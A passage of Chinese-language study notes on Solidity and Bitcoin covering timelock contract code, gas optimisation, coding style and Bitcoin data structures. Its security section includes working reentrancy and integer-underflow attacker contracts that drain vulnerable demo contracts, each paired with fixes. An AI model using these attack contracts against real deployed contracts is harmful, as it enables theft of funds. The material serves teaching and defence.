     * Emits one {CallScheduled} event per transaction in the batch.
     *
     * Requirements:
     *
     * - the caller must have the 'proposer' role.
     */
    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual onlyRole(PROPOSER_ROLE) {
        require(targets.length == values.length, "TimelockController: length mismatch");
        require(targets.length == payloads.length, "TimelockController: length mismatch");

        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
        _schedule(id, delay);
        for (uint256 i = 0; i < targets.length; ++i) {
            emit CallScheduled(id, i, targets[i], values[i], payloads[i], predecessor, delay);
        }
    }

    /**
     * @dev Schedule an operation that is to become valid after a given delay.
     */
    function _schedule(bytes32 id, uint256 delay) private {
        require(!isOperation(id), "TimelockController: operation already scheduled");
        require(delay >= getMinDelay(), "TimelockController: insufficient delay");
        _timestamps[id] = block.timestamp + delay;
    }

    /**
     * @dev Cancel an operation.
     *
     * Requirements:
     *
     * - the caller must have the 'canceller' role.
     */
    function cancel(bytes32 id) public virtual onlyRole(CANCELLER_ROLE) {
        require(isOperationPending(id), "TimelockController: operation cannot be cancelled");
        delete _timestamps[id];

        emit Cancelled(id);
    }

    /**
     * @dev Execute an (ready) operation containing a single transaction.
     *
     * Emits a {CallExecuted} event.
     *
     * Requirements:
     *
     * - the caller must have the 'executor' role.
     */
    // This function can reenter, but it doesn't pose a risk because _afterCall checks that the proposal is pending,
    // thus any modifications to the operation during reentrancy should be caught.
    // slither-disable-next-line reentrancy-eth
    function execute(
        address target,
        uint256 value,
        bytes calldata payload,
        bytes32 predecessor,
        bytes32 salt
    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
        bytes32 id = hashOperation(target, value, payload, predecessor, salt);

        _beforeCall(id, predecessor);
        _execute(target, value, payload);
        emit CallExecuted(id, 0, target, value, payload);
        _afterCall(id);
    }

    /**
     * @dev Execute an (ready) operation containing a batch of transactions.
     *
     * Emits one {CallExecuted} event per transaction in the batch.
     *
     * Requirements:
     *
     * - the caller must have the 'executor' role.
     */
    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt
    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
        require(targets.length == values.length, "TimelockController: length mismatch");
        require(targets.length == payloads.length, "TimelockController: length mismatch");

        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);

        _beforeCall(id, predecessor);
        for (uint256 i = 0; i < targets.length; ++i) {
            address target = targets[i];
            uint256 value = values[i];
            bytes calldata payload = payloads[i];
            _execute(target, value, payload);
            emit CallExecuted(id, i, target, value, payload);
        }
        _afterCall(id);
    }

    /**
     * @dev Execute an operation's call.
     */
    function _execute(address target, uint256 value, bytes calldata data) internal virtual {
        (bool success, ) = target.call{value: value}(data);
        require(success, "TimelockController: underlying transaction reverted");
    }

    /**
     * @dev Checks before execution of an operation's calls.
     */
    function _beforeCall(bytes32 id, bytes32 predecessor) private view {
        require(isOperationReady(id), "TimelockController: operation is not ready");
        require(predecessor == bytes32(0) || isOperationDone(predecessor), "TimelockController: missing dependency");
    }

    /**
     * @dev Checks after execution of an operation's calls.
     */
    function _afterCall(bytes32 id) private {
        require(isOperationReady(id), "TimelockController: operation is not ready");
        _timestamps[id] = _DONE_TIMESTAMP;
    }

    /**
     * @dev Changes the minimum timelock duration for future operations.
     *
     * Emits a {MinDelayChange} event.
     *
     * Requirements:
     *
     * - the caller must be the timelock itself. This can only be achieved by scheduling and later executing
     * an operation where the timelock is the target and the data is the ABI-encoded call to this function.
     */
    function updateDelay(uint256 newDelay) external virtual {
        require(msg.sender == address(this), "TimelockController: caller must be timelock");
        emit MinDelayChange(_minDelay, newDelay);
        _minDelay = newDelay;
    }

    /**
     * @dev See {IERC721Receiver-onERC721Received}.
     */
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    /**
     * @dev See {IERC1155Receiver-onERC1155Received}.
     */
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    /**
     * @dev See {IERC1155Receiver-onERC1155BatchReceived}.
     */
    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
```











### 重入攻击

**重入攻击：**例如，合约取款方法被多次触发，导致发送金额不符合预期流程。



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract Demo {
    mapping(address => uint256) public balances;

    //  存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 取款
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send");
        balances[msg.sender] -= _amount;
    }

    /*
     * ========================================
     * Helper
     * ========================================
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Demo public demo;

    constructor(address _demoAddress) public {
        demo = Demo(_demoAddress);
    }

    fallback() external payable {
        if (address(demo).balance >= 1 ether) {
            demo.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether");
        demo.deposit{value: 1 ether}();
        demo.withdraw(1 ether);
    }

    /*
     * ========================================
     * Helper
     * ========================================
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

合约测试

- address1 部署 `Demo`
- address1 调用 `Demo.deposit` 存入 10 ETH
- address1 调用 `Demo.getBalance` 查看余额
- address2 部署攻击合约`Attack`;
  - 参数是 Demo 合约地址
- address2 调用 `Attack.attack` ，并且发送 1Eth，发起攻击
- 查看 `Attack.getBalance` 余额
- 查看 `Demo.getBalance` 余额















**如何避免重入攻击：**

1. 先赋值再进行转账

   修改前：

   ```
   (bool success, ) = msg.sender.call{value: _amount}("");
   require(success, "Failed to send");
   balances[msg.sender] -= _amount;
   ```

   修改后：

   ```
    balances[msg.sender] -= _amount;
   (bool success, ) = msg.sender.call{value: _amount}("");
   require(success, "Failed to send");
   ```

   修改后，再次跳用，因为数据已经被修改了，所以报错 `"Failed to send".`

2. 使用新版本的 Solidity 编写，

   1. 比如上面使用的是`^0.6.10`，换成`^0.8.16` 就没有这个问题。

3. 使用状态变量和`modifier`配合做防重入锁

   1. 比如在 `withdraw` 上增加如下修改器。

   ```
    bool internal locked;
   
    modifier noReentrant() {
        require(!locked, "no reentrant");
        locked = true;
        _;
        locked = false;
    }
   ```







### 数字溢出攻击

- `uint` 相当于`uint256`
  - 范围: `0 <= x <= 2**256 -1`
  - 上溢(**overflow**): 超出 `2**256 -1` 后，变成 0
  - 下溢(**underflow**): 低于 `0` 后，变成 `2**256 -1`





**示例：**

下面是一个锁定合约，可以通过攻击，忽略锁定期直接取钱，无需等待。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract Demo {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    // 存
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    // 取
    function withdraw() external {
        require(balances[msg.sender] > 0, "Insufficient balance");
        require(lockTime[msg.sender] < block.timestamp, "lock-in period");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Send failed");
    }

    // 续时间
    function increaseLockTime(uint256 time) public {
        lockTime[msg.sender] += time;
    }
}

contract Attack {
    Demo public demo;

    constructor(address _demoAddress) public {
        demo = Demo(_demoAddress);
    }

    fallback() external payable {}

    function attack() external payable {
        demo.deposit{value: msg.value}();
        // uint(-1) => uint(2**256-1)
        // currentTime = demo.balances(msg.sender)
        // 增加的时间 x  = 2**256 - currentTime
        // 增加的时间 x  = - currentTime
        demo.increaseLockTime(uint256(-demo.lockTime(address(this))));
        demo.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

合约测试

- 部署 Demo
- 部署 Attack ，使用 Demo 地址。
- 使用 `Attack.attack`
- 调用 `Attack.getBalance` 发现钱已经取回来了。





**如何避免溢出攻击：**

1. 使用高版本的 Solidity，比如 `^0.8.16;`

2. 引用 `OpenZeppelin`，使用其中的 `SafeMath` 进行操作

   1. 此时再进行攻击，会收到 SafeMath 内的报错 `"SafeMath: addition overflow".`

   ```solidity
   import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";
   function increaseLockTime(uint256 time) public {
       // lockTime[msg.sender] += time;
       lockTime[msg.sender] = lockTime[msg.sender].add(time); // add 是 SafeMath 内的方法
   }
   ```









## Gas优化

### 省gas总结

+ 使用短路模式来排序操作
+ 函数使用`external`+`calldata`
  + 对`memory`类型的参数，使用`external`并且参数标注为`calldata`最省gas
+ 使用正确的数据类型
  + gas由小到大：值类型 < 引用类型
+ 循环中不操作`storage`变量
+ 循环中的不重复计算数据
  + 能不在循环中操作的数据，就尽量放在外面计算
+ 多个循环可以合并就尽量合并。（尽量少使用循环）
+ 可预测的结果，不要通过代码计算
+ 避免死代码
+ 避免不必要的判断
+ 删除不必要的操作
+ 函数中能不用return，就尽量不用return
+ 库合约使用`using ... for...`比直接用更省gas
+ mapping的key使用bytes32，而不使用字符串，可以省gas
+ `private`变量比`public`变脸更省gas











### 使用短路模式来排序操作

短路（short-circuiting）是利用逻辑或(`||`),逻辑与(`&&`)的特性，来排序不同成本操作的开发模式；核心是 **它将低 gas 成本的操作放在前面，高 gas 成本的操作放在后面**；这样如果前面的低成本操作不可行，就可以跳过（短路）后面的高成本以太坊操作了。

- 前面判断为 true，执行后面的条件判断
- 前面判断为 false，跳过后面的条件判断
  - 这样就把后面条件的运行 gas 给节省下来了

```solidity
// f(x) 是低gas成本的操作
// g(y) 是高gas成本的操作

// 按如下排序不同gas成本的操作
f(x) || g(y)
f(x) && g(y)
```

这里哪个判断在前面，哪个判断在后面，需要根据实际情况来安排。



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    // gas值如下
    // 输入 1:   22050
    // 输入 2:   22065
    // 输入 101: 22050
    // 输入 102: 22055
    // 平均值: (22050+22065+22050+22055)/4 = 22055
    function test1(uint256 _amount) external pure returns (bool) {
        bool isEven = _amount % 2 == 0;
        bool isLessThan99 = _amount < 99;
        if (isEven && isLessThan99) {
            return true;
        }
        return false;
    }

    // gas值如下
    // 输入 1:   22040
    // 输入 2:   22061
    // 输入 101: 22040
    // 输入 102: 22051
    // 平均值: (22040+22061+22040+22051)/4 = 22048
    function test2(uint256 _amount) external pure returns (bool) {
        if (_amount % 2 == 0 && _amount < 99) {
            return true;
        }
        return false;
    }

    // gas值如下
    // 输入 1:   22073
    // 输入 2:   22083
    // 输入 101: 21881
    // 输入 102: 21881
    // 平均值: (22073+22083+21881+21881)/4 = 21979.5 ✅ 平均值最低
    function test3(uint256 _amount) external pure returns (bool) {
        if (_amount < 99 && _amount % 2 == 0) {
            return true;
        }
        return false;
    }
}
```







### 函数使用`external`+`calldata`

在合约开发种，显式声明函数的可见性不仅可以提高智能合约的安全性，同时也有利于优化合约执行的 gas 成本。

例如，通过显式地标记函数为外部函数 `external`，可以强制将函数参数的存储位置设置为 calldata，这会节约每次函数执行时所需的以太坊 gas 成本。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    // gas值如下
    // 输入 a       :   22965
    // 输入 abc     :   22989
    // 输入 hello   :   23013
    // 平均值: (22965+22989+23013)/3 = 22989
    function test1(string memory _str) public pure returns (string memory) {
        return _str;
    }

    // gas值如下
    // 输入 a       :   22943
    // 输入 abc     :   22967
    // 输入 hello   :   22991
    // 平均值: (22943+22967+22991)/3 = 22967
    function test2(string memory _str) external pure returns (string memory) {
        return _str;
    }

    // gas值如下
    // 输入 a       :   22705
    // 输入 abc     :   22729
    // 输入 hello   :   22753
    // 平均值: (22705+22729+22753)/3 = 22729 ✅ 平均值最低
    function test3(string calldata _str) external pure returns (string memory) {
        return _str;
    }
}
```

注意这种方法只对 `memory` 类型的数据有效，如果是操作普通的类型，可见性没有影响。如下例子我将上面短路操作例子中 `external` 改为 `public`,所消耗的 gas 并没有任何影响

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    // gas值如下
    // 输入 1:   22050  | 改为 public 后: 22050
    // 输入 2:   22065  | 改为 public 后: 22065
    // 输入 101: 22050  | 改为 public 后: 22050
    // 输入 102: 22055  | 改为 public 后: 22055
    // 平均值: (22050+22065+22050+22055)/4 = 22055
    function test1(uint256 _amount) public pure returns (bool) {
        bool isEven = _amount % 2 == 0;
        bool isLessThan99 = _amount < 99;
        if (isEven && isLessThan99) {
            return true;
        }
        return false;
    }

    // gas值如下
    // 输入 1:   22040  | 改为 public 后: 22040
    // 输入 2:   22061  | 改为 public 后: 22061
    // 输入 101: 22040  | 改为 public 后: 22040
    // 输入 102: 22051  | 改为 public 后: 22051
    // 平均值: (22040+22061+22040+22051)/4 = 22048
    function test2(uint256 _amount) public pure returns (bool) {
        if (_amount % 2 == 0 && _amount < 99) {
            return true;
        }
        return false;
    }

    // gas值如下
    // 输入 1:   22073  | 改为 public 后: 22073
    // 输入 2:   22083  | 改为 public 后: 22083
    // 输入 101: 21881  | 改为 public 后: 21881
    // 输入 102: 21881  | 改为 public 后: 21881
    // 平均值: (22073+22083+21881+21881)/4 = 21979.5 ✅ 平均值最低
    function test3(uint256 _amount) public pure returns (bool) {
        if (_amount < 99 && _amount % 2 == 0) {
            return true;
        }
        return false;
    }
}
```







### 使用正确的数据类型

有些数据类型要比另外一些数据类型的 gas 成本高。我们有必要了解可用数据类型的 gas 利用情况，以便根据你的需求选择效率最高的那种。下面是关于数据类型 gas 消耗情况的一些规则：

- 在任何可以使用 `uint256` 类型的情况下，不要使用 `string` 类型
- 存储 `uint256` 要比存储 `uint8` 的 gas 成本低，为什么？点击这里 [查看原文](https://ethereum.stackexchange.com/questions/3067/why-does-uint8-cost-more-gas-than-uint256)
- 当可以使用 `bytes32` 类型时，不要使用` byte[]` 类型
- 如果 `bytes32` 的长度有可以预计的上限，那么尽可能改用 `bytes1`~`bytes32` 这些具有固定长度的类型
- `bytes32` 所需的 gas 成本要低于 `string` 类型
- `bool > unit256 > uint8 > bytes1 > bytes32 > bytes > string`





#### 存储对比

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint256 public test3 = 0; // 23494
    uint8 public test1 = 0; // 23554
    bool public test2 = false; // 23630
    bytes1 public test4 = 0x30; // 23601
    // 23516
    bytes32 public test5 =
        0x3000000000000000000000000000000000000000000000000000000000000000;
    string public test7 = "0"; // 24487
    bytes public test6 = bytes("0"); // 24531
}
```







#### 返回对比

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    // uint256 :21415
    function test1() external pure returns (uint256) {
        return 0;
    }

    // uint8 : 21444
    function test2() external pure returns (uint8) {
        return 0;
    }

    // bool :21400
    function test3() external pure returns (bool) {
        return false;
    }

    // bytes1 :21479
    function test4() external pure returns (bytes1) {
        return 0x30;
    }

    // bytes32 :21430
    function test5() external pure returns (bytes32) {
        return
            0x3000000000000000000000000000000000000000000000000000000000000000;
    }

    // bytes :21845
    function test6() external pure returns (bytes memory) {
        return bytes("0");
    }

    // string :21801
    function test7() external pure returns (string memory) {
        return "0";
    }
}
```









### 循环中不操作`storage`变量

管理 storage 变量的 gas 成本要远远高于内存变量，所以要避免在循环中操作 storage 变量。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint256 public num = 0;

    // 输入 5 : 46475 gas
    function test1(uint256 x) public {
        for (uint256 i = 0; i < x; i++) {
            num += 1;
        }
    }

    // 输入 5 : 45651 gas
    function test2(uint256 x) public {
        uint256 temp = num;
        for (uint256 i = 0; i < x; i++) {
            temp += 1;
        }
        num = temp;
    }
}
```









### 循环中的不重复计算数据

- 能不在循环中操作的数据，就尽量放在外面计算

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint256 a = 4;
    uint256 b = 5;

    function repeatedComputations(uint256 x) public view returns (uint256) {
        uint256 sum = 0;
        for (uint256 i = 0; i <= x; i++) {
            sum = sum + a * b;
        }
    }
}
```





### 尽量少用循环

**多个循环可以合并就尽量合并，循环尽量不用**

有时候在 Solidity 智能合约中，你会发现两个循环的判断条件一致，那么在这种情况下就没有理由不合并它们。例如下面的以太坊合约代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    function loopFusion(uint256 x, uint256 y) public pure returns (uint256) {
        for (uint256 i = 0; i < 100; i++) {
            x += 1;
        }
        for (uint256 i = 0; i < 100; i++) {
            y += 1;
        }
        return x + y;
    }
}
```









### 可预测的结果，不同过代码计算

如果一个循环计算的结果是无需编译执行代码就可以预测的，那么就不要使用循环，这可以可观地节省 gas。

例如下面的以太坊合约代码就可以直接设置 num 变量的值：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    function constantOutcome() public pure returns (uint256) {
        uint256 num = 0;
        for (uint256 i = 0; i < 100; i++) {
            num += 1;
        }
        return num;
    }
}
```







### 避免死代码

死代码（Dead code）是指那些永远也不会执行的 Solidity 代码，例如那些执行条件永远也不可能满足的代码，就像下面的两个自相矛盾的条件判断里的代码块，消耗了以太坊 gas 资源但没有任何作用：

```solidity
if (x < 1) {
    if (x > 2) {
        return x;
    }
}
```



### 避免不必要的判断



有些条件断言的结果不需要代码的执行就可以了解，那么这样的条件判断就可以精简掉。例如下面的 Solidity 合约代码中的两级判断条件，最外层的判断是在浪费宝贵的以太坊 gas 资源：

```solidity
 if(x < 1) {
    if(x < 0) {
      return x;
    }
  }
```



### 删除不必要的库

在开发 Solidity 智能合约时，我们引入的库通常只需要用到其中的部分功能，这意味着其中可能会包含大量对于我们的智能合约而言是冗余代码。如果可以在自己的合约里安全有效地实现所依赖的库功能，那么就能够达到优化合约的 gas 利用的目的。

例如，在下面的 solidity 代码中，我们的以太坊合约只是用到了 SafeMath 库的 add 方法：

```solidity
import './SafeMath.sol' as SafeMath;

contract SafeAddition {
  function safeAdd(uint a, uint b) public pure returns(uint) {
    return SafeMath.add(a, b);
  }
}

```

```solidity
contract SafeAddition {
  function safeAdd(uint a, uint b) public pure returns(uint) {
    uint c = a + b;
    require(c >= a, "Addition overflow");
    return c;
  }
}
```





### 优化案例

本篇主要介绍 gas 的优化。

- 函数输入参数:使用 `calldata` ，不使用 `memory`。
- 读取状态变量:使用。
- 使用数组时候:
  - for 循环时，缓存数组长度
  - 储存数组的元素到 `memory`。
- short circuit：&& 短路操作
  - `A && B`,A 表达式 不成立，则不计算 B 表达式
- loop increments

下面默认的 Gas 是 50518 gas



**原始代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Gas {
    uint256 public total;

    // [1,2,3,4,5,100]
    function demo(uint256[] memory nums) external {
        for (uint256 index = 0; index < nums.length; index++) {
            bool isEven = nums[index] % 2 == 0;
            bool isLessThan99 = nums[index] < 99;
            if (isEven && isLessThan99) {
                total += nums[index];
            }
        }
    }
}
/**
  * 默认: 50518 gas
  *
```





**优化后代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Gas {
    uint256 public total;

    // [1,2,3,4,5,100]
    function demo(uint256[] calldata nums) external {
        uint256 _total = total;
        uint256 len = nums.length;
        for (uint256 index = 0; index < len; ++index) {
            uint256 num = nums[index];
            if (num % 2 == 0 && num < 99) {
                _total += num;
            }
        }
        total = _total;
    }
}

/**
 * 默认 => 50518 gas
 * 1. 函数参数不使用 memory，改用 calldata
 *      => 48773    节省了 1745
 * 2. 状态变量在函数内不每次都读取和修改，缓存到内存里，统一修改
 *      => 48562    节省了 211
 * 3. 短路(条件 &&)
 *      => 48244    节省了 318
 * 4. 循环增量 i++ 改为 ++i
 *      => 48214    节省了 30
 * 5. 循环时，缓存数组的长度 uint256 len = nums.length;
 *      => 48179    节省了 35
 * 6. 数组的元素，提前缓存，不重复读取
 *      => 48017    节省了 162
 *
 */
```











## 合约编码规范

常见的代码规范：

+ **如果合约对状态变量进行了修改，需要抛出事件**
+ **构造函数的参数必须是`storage`或`memory`，不能使用`calldata`**
+ 版权注释在文件的任何位置都可以编译器识别，但建议把它放在源文件顶部的第一行



### 代码中的各部分顺序







### 文件结构的分享

代码中各部分顺序如下：

+ License
+ Pragma
+ import
+ interface
+ library
+ contract



在interface、库library、contract中的执行顺序：

+ Type declaration ： 类型声明
+ State variable：状态变量
+ Event：事件
+ Modifier：函数修改器
+ Errors：自定义错误
+ Constructor：构造函数
+ Function：函数
  + 函数按照可见性排序：`external、public、internal、private`
  + 同一可见性：按照状态可变性排序：`payable、无、view、pure`



### 命名约定

+ 合约和库名：大驼峰式命名

  ```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.17;
  
  contract Owned {
      //...
  }
  ```

  

+ 合约和苦命：匹配它们的文件名

  ```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.17;
  
  // 文件名:Owned.sol
  contract Owned {
      //...
  }
  ```



+ 如果文件中有多个合约或库，使用核心合约或库名称

  ```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.17;
  
  // 文件名:Owned.sol
  contract Owned {
      address public owner;
  
      constructor() public {
          owner = msg.sender;
      }
  
      modifier onlyOwner() {
          //....
          _;
      }
  
      function transferOwnership(address newOwner) public onlyOwner returns(true){
          //...
          return true;
      }
  }
  ```

  ```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.17;
  
  import "./Owned.sol";
  
  // Congress.sol
  contract Congress is Owned {
  //...
  }
  ```

  

+ 结构体名称：大驼峰式命名

  ```solidity
  struct BookInfo {
      string title;
      string author;
      uint256 book_id;
  }
  ```

  

+ 事件名称：大驼峰式命名

  ```solidity
  event AfterTransfer(address ads);
  ```

  

+ 函数名：小驼峰式命名

  ```solidity
  function balanceOf(address account) external view returns (uint256){};
  ```

  

+ internal 函数名：`_`+小驼峰式命名

  ```solidity
  function _grantRole(address _ads, bytes32 _role) internal {}
  ```



+ internal 变量：`_`+小驼峰式命名



+ 函数参数：小驼峰式命名+`_`

  ```solidity
  constructor(string memory name_, string memory symbol_) {
      _name = name_;
      _symbol = symbol_;
  }
  ```

  

+ 局部变量和状态变量：小驼峰式命名

  ```solidity
  mapping(address => uint256) public balanceOf;
  ```

  

+ 常量：大写字母单词下划线分隔开

  ```solidity
  address public constant MIN_BLOCKS;
  ```

  

+ 函数修改器：小驼峰式命名

  ```solidity
  modifier onlyOwner(){
      require(msg.sender==owner,"must owner address");
      _;
  }
  
  ```

  

+ 枚举的名称：大驼峰式命名

  ```solidity
  enum Status {
      None,
      Pending,
      Shiped,
      Completed,
      Rejected,
      Canceled
  }
  ```

  











### 更多内容

重要需要总结的内容:

https://docs.soliditylang.org/zh/latest/style-guide.html











































































# BitCoin



## BTC-密码学原理

### 哈希

常用的哈希函数：SHA-256，Keccak，SM3。**其中SHA-256哈希函数目前被广泛应用区块链中。**



#### 哈希碰撞

对于任意 x ≠ y，很难==**人为**==找到x和y，使得 H(x)=H(y)。实际上，哈希碰撞时客观存在的，但是**人为无法找到两个数的哈希值恰好相等**。



#### 单向性

==可以计算x的哈希值，但是**无法从H(x)中反推出任何关于x的信息**。==但是也是存在前提的，就是的x的输入空间必须足够大且分布均匀，如果输入空间较小或输入值集中某一区域，则可以通过暴力破解方法获取x。



#### 谜题友好性（puzzle friendly）

在区块链中，哈希函数必须还应存在一个特性，即 puzzle friendly 。**无法通过输入值x，事先预测到哈希值的范围。**





### 签名

目前常用的签名算法都是通过非对称加密体系。 常见的签名算法，RSA和ECC加密算法，RSA和ECC的私钥用于签名，公钥用于验证。==**目前，ECC加密算法被广泛用于区块链中的签名**。==





## BTC-数据结构



### 哈希指针

**哈希指针是一个指向数据存储位置，以及该存储位置里面的数据的哈希值**。

一个普通的指针指向数据的存储位置，==**而哈希指针不仅可以知道数据的存储位置，还可以验证该存储位置中的数据是否发生篡改**==。





**哈希指针包含两个部分：数据的存储位置和数据的哈希值**

![image-20230411152113369](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411152113369.png)







**哈希指针用于构建链表，即称为区块链**



![image-20230411152315008](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411152315008.png)



==**注意**：**哈希指针中的哈希值是前一个区块中区块头的哈希值（因为在区块头中包含了所有交易的Merkle的哈希值），其中还包括了指向该块之前块的哈希指针**。==这使得在不通知他人的情况下篡改区块链中的区块内容是不可能的。我们只需要保留指向区块链最后一个块的哈希指针即可。





### Merkle Tree

**默克尔树（Merkle Tree）是带有哈希指针的二进制树结构。**其中，叶子节点是数据块，**L1、L2、L3、L4 代表一个个交易**，树中更远的节点是它们各自子级的哈希。



![image-20230411152846266](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411152846266.png)





### BTC-区块结构

比特币中的数据区块主要由区块头（block header）和区块体（block body）两部分组成，其中区块头记录当前区块的元数据，而区块体则存储封装到该区块的实际交易数据。

![image-20230411161421322](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411161421322.png)

**比特币系统的区块结构图：**

![image-20230411161512458](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411161512458.png)





**比特币系统区块头的数据项说明：**

![image-20230411161629704](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411161629704.png)



**比特币系统区块体数据项说明：**

![image-20230411161704078](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230411161704078.png)





## BTC-协议



### 比特币转账交易过程

![image-20230414191421078](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230414191421078.png)

第一个区块中是铸币交易，每发生一笔交易转账，必须知道币是哪来的，说明币的来源，防止双花攻击。

**在比特币转账中，转账其实包含输入和输出，输入中必须包含币的来源和转账方的公钥（用于验证签名）**，**输出中包含了转账金额以及转给谁的公钥哈希**。

==注意：这里存在一个问题，就是在进行转账时，转账方的公钥必须满足币的来源中的哈希值（即之前这币转给谁的哈希值）==





### FLP不可能原理

在异步系统中，网络时延没有上限，哪怕系统中只有一个成员是faulty，也无法达成共识。





### CAP理论

C：consistency（一致性）

A：availability（可用性）

P：partition tolerance（分区容错性）

CAP理论：该三条性质只能满足其中两个，无法同时满足上面三个特性。





### 比特币共识协议（PoW）

靠算力来投票，其实就是选择nonce值，计算区块头哈希值满足目标值，争夺记账权。



### 女巫攻击（Sybil attack）

**女巫攻击：是指少数节点控制多个虚假身份，从而利用这些身份控制或影响网络中大量正常节点的攻击方式。**

在区块链系统中，如果某个节点通过创建大量账户（超过一半），就可以影响投票结果。所以在比特币系统中，简单投票是不行的（因为某个节点可以很容易创建大量的账户）



### 分叉攻击（forking attack）

![image-20230414195536643](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230414195536643.png)

比特币协议中，要等该块之后产生**六个区块**，此时才能认为该块中交易是不可篡改的。



### 区块奖励

从最开始50BTC，**每产生210000个区块，奖励就会减半**。**最后产生总的比特币数量为2100万。**





## BTC-实现

### UTXO（unspent transaction ouput）数据结构

全节点需要在内存在维护UTXO数据结构，以便快速检测该钱是否已经合法（有没有被花出去了）





### 产生新区块示例

![image-20230414203347249](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230414203347249.png)



![image-20230414203522008](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230414203522008.png)



 





## BTC-网络

**BTC网络工作原理：**

BTC区块链是在应用层，而网络层采用的是：P2P Overlay network，节点之间是tcp通信。



BTC网络设计原则：简单，健壮，而不是高效。





BTC区块的限制是1M







## BTC-挖矿难度

比特币中想要获得出块权，必须保证：$H(block\_header)\le target$



**比特币中规定每2016个区块后，差不多14天就会调整挖矿难度。**



$target = target \times \frac{actual\_time}{expected\_time}$，其中$expected\_time=2016区块\times 10分钟$，$actual\_time是最近产生2016个区块实际花费的时间$。





## BTC-挖矿



### 全节点

![image-20230415152206824](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230415152206824.png)





### 轻节点

![image-20230415152412723](C:\Users\18390\AppData\Roaming\Typora\typora-user-images\image-20230415152412723.png)









## BTC-脚本

[09-BTC-比特币脚本_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Vt411X7JF?p=9&spm_id_from=pageDriver&vd_source=f0bcc8cf1682bd302fd8fa31924451d2)







## BTC-分叉



**硬分叉**：是区块链中一个永久分歧。通常在已按照新的共识规则进行了版本升级的节点产生了新区块时，那些未升级节点无法验证这些新区块时产生硬分叉





**软分叉**：软分叉区块链中的一个短暂分叉，通常是由于矿工在不知道新共识规则的情况下，未对其使用节点进行升级而产生的。软分叉是与共识规则的前向兼容并作些变化，允许未升级的客户端程序继续与新规则同时工作。





## BTC-匿名性

[12-BTC-匿名性_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Vt411X7JF?p=12&vd_source=f0bcc8cf1682bd302fd8fa31924451d2)







## BTC-思考

**哈希指针：**

区块链中的哈希指针其实只是一个形象的说法，实际上块内只有哈希值没有指针。全节点会将区块保存在key-value数据库中（常见的levelDB数据库），key对应的就是区块的哈希值，value对应是块的内容。当我们知道最后一个哈希值时，就可以从数据库中取出该哈希值对应的区块，该区块中又包含了上一个区块的哈希值，从而能找到所有的区块信息。









# Ethereum

